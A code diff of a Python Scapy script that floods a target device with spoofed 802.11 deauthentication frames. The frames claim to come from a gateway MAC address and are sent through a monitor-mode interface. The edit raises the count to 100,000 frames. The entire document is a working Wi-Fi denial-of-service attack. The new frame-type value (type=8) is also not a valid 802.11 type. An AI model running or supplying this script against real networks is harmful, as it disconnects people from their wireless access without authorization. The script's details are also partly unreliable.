@@ -1,10 +1,15 @@
-from scapy.all import *
+from scapy.all import (
+  RadioTap,    # Adds additional metadata to an 802.11 frame
+  Dot11,       # For creating 802.11 frame
+  Dot11Deauth, # For creating deauth frame
+  sendp        # for sending packets
+)
 
-target_mac = "98:09:cf:1a:12:ab"
-gateway_mac = "00:11:32:D3:0C:09"
+target_mac = "A2:9A:4A:46:01:9F"
+gateway_mac = "90:9A:4A:46:01:9F"
 
-dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
+dot11 = Dot11(type=8, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
 
-packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
+frame = RadioTap()/dot11/Dot11Deauth()
 
-sendp(packet, inter=0.05, count=8000, iface="wlan0mon", verbose=1)
+sendp(frame, iface="wlan0mon", count=100000, inter=0.1)
